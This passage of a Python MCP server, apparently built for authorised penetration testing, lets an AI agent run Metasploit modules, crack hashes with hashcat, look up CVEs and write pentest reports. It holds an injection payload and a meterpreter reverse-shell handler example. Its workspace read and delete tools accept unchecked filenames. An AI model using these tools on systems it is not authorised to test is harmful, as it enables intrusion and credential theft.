            "Argument injection: user(id: \"1 OR 1=1\")",
        ],
    }

    result = payloads.get(vuln_type.lower(), [f"Unknown type: {vuln_type}"])
    return f"[{vuln_type}] Context: {context}\n\n" + "\n".join(result)

@mcp.tool()
def run_metasploit(module: str, options: dict) -> str:
    """
    Execute a Metasploit module.
    module: e.g. 'exploit/multi/handler'
    options: {'LHOST':'10.0.0.1','LPORT':'4444','PAYLOAD':'linux/x64/meterpreter/reverse_tcp'}
    """
    opts = "\n".join([f"set {k} {v}" for k, v in options.items()])
    msf_cmd = f"use {module}\n{opts}\nrun \nexit"
    result = run(["msfconsole", "-q", "-x", msf_cmd], timeout=60)
    log("metasploit", module, "executed")
    return result

@mcp.tool()
def crack_hash(hash_value: str, hash_type: str = "auto",
               wordlist: str = "/usr/share/wordlists/rockyou.txt") -> str:
    """
    Crack a hash with hashcat.
    hash_type: auto | md5 | sha1 | sha256 | ntlm | bcrypt | sha512crypt
    """
    type_map = {
        "auto": None, "md5": "0", "sha1": "100", "sha256": "1400",
        "ntlm": "1000", "bcrypt": "3200", "sha512crypt": "1800"
    }
    mode = type_map.get(hash_type.lower())
    cmd = ["hashcat", "-a", "0", hash_value, wordlist, "--quiet"]
    if mode:
        cmd += ["-m", mode]
    result = run(cmd, timeout=300)
    log("crack_hash", hash_value[:20], f"type={hash_type}")
    return result

@mcp.tool()
def cve_lookup(cve_id: str) -> str:
    """Fetch CVE details from NVD. Example: CVE-2021-44228"""
    result = run(["curl", "-sk", f"https://services.nvd.nist.gov/rest/json/cves/2.0?cveId={cve_id}"], timeout=30)
    try:
        data  = json.loads(result)
        vuln  = data["vulnerabilities"][0]["cve"]
        desc  = vuln["descriptions"][0]["value"]
        score = vuln.get("metrics", {}).get("cvssMetricV31", [{}])[0].get("cvssData", {}).get("baseScore", "N/A")
        return f"CVE: {cve_id}\nScore: {score}\nDescription: {desc}"
    except Exception:
        return result
    
# ─── Reporting ────────────────────────────────────────────────────────────────

@mcp.tool()
def generate_report(target: str, findings: str) -> str:
    """
    Generate a structured pentest/bug bounty report in Markdown.
    findings: JSON or plain text describing vulnerabilities.
    """
    report = f"""# Penetration Test Report

**Target:** {target}
**Date:** {datetime.utcnow().strftime('%Y-%m-%d')}
**Tester:** OffSec MCP (Claude-assisted)

---

## Executive Summary

Assessment of {target} identified the following security issues.

---

## Findings

{findings}

---

## Methodology

Recon -> Enumeration -> Vulnerability Identification -> Exploitation -> Post-Exploitation -> Reporting

---

## Tools Used

subfinder, amass, httpx, nmap, nuclei, ffuf, sqlmap, dalfox,
testssl.sh, shodan, hydra, hashcat, metasploit, websocat

---

*Report generated by OffSec MCP Server*
"""
    report_file = WORKSPACE / f"report_{target.replace('.','_')}_{datetime.utcnow().strftime('%Y%m%d')}.md"
    report_file.write_text(report)
    log("generate_report", target, str(report_file))
    return f"Report saved to {report_file}\n\n{report}"

@mcp.tool()
def list_workspace() -> str:
    """List all files in the workspace (scan results, reports, screenshots)."""
    files = list(WORKSPACE.rglob("*"))
    if not files:
        return "Workspace is empty."
    return "\n".join([
        f"{f.stat().st_size:>10} bytes  {f.relative_to(WORKSPACE)}"
        for f in sorted(files) if f.is_file()
    ])

@mcp.tool()
def read_workspace_file(filename: str) -> str:
    """Read a file from the workspace by name."""
    target_file = WORKSPACE / filename
    if not target_file.exists():
        return f"[ERROR] File not found: {filename}"
    return target_file.read_text()

@mcp.tool()
def delete_workspace_file(filename: str) -> str:
    """Delete a file from the workspace by name."""
    target_file = WORKSPACE / filename
    if not target_file.exists():
        return f"[ERROR] File not found: {filename}"
    target_file.unlink()
    return f"Deleted: {filename}"

@mcp.tool()
def show_activity_log(lines: int = 50) -> str:
    """Show the last N lines of the activity log."""
    if not LOG_FILE.exists():
        return "No activity logged yet."
    all_lines = LOG_FILE.read_text().splitlines()
    return "\n".join(all_lines[-lines:])

# ─── Entry Point ──────────────────────────────────────────────────────────────

if __name__ == "__main__":
    mcp.run(transport="stdio")
